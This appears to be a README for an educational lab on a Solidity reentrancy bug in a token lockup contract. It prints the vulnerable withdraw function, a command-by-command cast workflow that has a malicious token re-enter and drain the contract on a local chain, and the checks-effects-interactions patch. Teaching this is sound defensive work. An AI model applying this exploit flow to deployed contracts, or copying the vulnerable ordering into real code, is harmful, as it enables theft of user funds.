🔥 Lockup Reentrancy Lab

A hands-on smart contract security research project demonstrating:

❌ Vulnerable lockup contract

💥 Reentrancy exploit using a malicious token

✅ Patched implementation

🧪 Real attacker workflow using cast send



---

📌 Overview

This repo demonstrates how improper ordering of state updates and external calls can introduce a reentrancy vulnerability.

The vulnerable contract performs:

token.transfer(msg.sender, amount);
balances[msg.sender] = 0;

This violates the Checks-Effects-Interactions (CEI) pattern.


---

🧨 Vulnerability

Vulnerable Pattern

function withdraw() external {
    uint256 amount = balances[msg.sender];

    token.transfer(msg.sender, amount);

    balances[msg.sender] = 0;
}

Why this is dangerous

The external call executes BEFORE internal accounting is updated.

A malicious token can reenter withdraw() before:

balances[msg.sender] = 0;

allowing repeated withdrawals.


---

⚔️ Exploit Flow

Attacker
   ↓
EvilToken.attack()
   ↓
Lockup.
🚀 Local Setup

Install Foundry

curl -L https://foundry.paradigm.xyz | bash
foundryup


---

⚙️ Environment Setup

Create .env:

RPC=http://127.0.0.1:8545

DEPLOYER_PK=0xYOUR_PRIVATE_KEY
ATTACKER_PK=0xYOUR_PRIVATE_KEY

Load variables:

source .env


---

🧪 Build Contracts

forge clean
forge build


---

⛓️ Start Local Chain

Run:

anvil

Copy the private keys shown by Anvil into .env.


---

🔥 Real Exploit Demonstration (cast workflow)

This project intentionally uses cast send to simulate a REAL attacker interaction flow instead of relying only on forge test.


---

1️⃣ Deploy EvilToken

TOKEN=$(forge create src/EvilToken.sol:EvilToken \
  --rpc-url $RPC \
  --private-key $DEPLOYER_PK \
  | grep "Deployed to:" | awk '{print $3}')

Verify:

echo $TOKEN
cast code $TOKEN


---

2️⃣ Deploy Vulnerable Lockup

UNLOCK_TIME=$(($(date +%s) - 10))

LOCKUP=$(forge create src/LockupVulnerable.sol:LockupVulnerable \
  --rpc-url $RPC \
  --private-key $DEPLOYER_PK \
  --constructor-args $TOKEN $TOKEN $UNLOCK_TIME \
  | grep "Deployed to:" | awk '{print $3}')

Verify:

echo $LOCKUP
cast code $LOCKUP


---

3️⃣ Configure EvilToken Target

cast send $TOKEN \
  "setTarget(address)" \
  $LOCKUP \
  --private-key $DEPLOYER_PK \
  --rpc-url $RPC


---

4️⃣ Disable Attack During Funding

cast send $TOKEN \
  "setAttack(bool)" false \
  --private-key $DEPLOYER_PK \
  --rpc-url $RPC


---

5️⃣ Fund Lockup

cast send $TOKEN \
  "transfer(address,uint256)" \
  $LOCKUP 100000000000000000000 \
  --private-key $DEPLOYER_PK \
  --rpc-url $RPC


---

6️⃣ Register Deposit

cast send $LOCKUP \
  "deposit(uint256)" \
  100000000000000000000 \
  --private-key $ATTACKER_PK \
  --rpc-url $RPC
---
OR 
---

cd script
chmod +x ./script.sh
./script.sh
---

7️⃣ Enable Reentrancy Attack

cast send $TOKEN \
  "setAttack(bool)" true \
  --private-key $ATTACKER_PK \
  --rpc-url $RPC


---

8️⃣ Check Balances BEFORE Exploit

cast call $TOKEN \
  "balanceOf(address)" \
  $LOCKUP \
  --rpc-url $RPC

cast call $TOKEN \
  "balanceOf(address)" \
  $TOKEN \
  --rpc-url $RPC


---

9️⃣ Execute Exploit

cast send $TOKEN \
  "attack()" \
  --private-key $ATTACKER_PK \
  --rpc-url $RPC


---

🔟 Check Balances AFTER Exploit

cast call $TOKEN \
  "balanceOf(address)" \
  $LOCKUP \
  --rpc-url $RPC

cast call $TOKEN \
  "balanceOf(address)" \
  $TOKEN \
  --rpc-url $RPC

If the exploit succeeds:

Lockup balance decreases repeatedly
Attacker balance increases beyond intended withdrawal amount


---

🛡️ Patched Version

The safe implementation follows CEI:

balances[msg.sender] = 0;
require(token.transfer(msg.sender, amount), "transfer failed");


---

⚠️ Disclaimer

This project is for educational purposes only.
Do NOT use vulnerable code in production.

---

🧠 Key Takeaway

«Reentrancy is not about whether callbacks exist —
it’s about when state changes relative to external calls.»
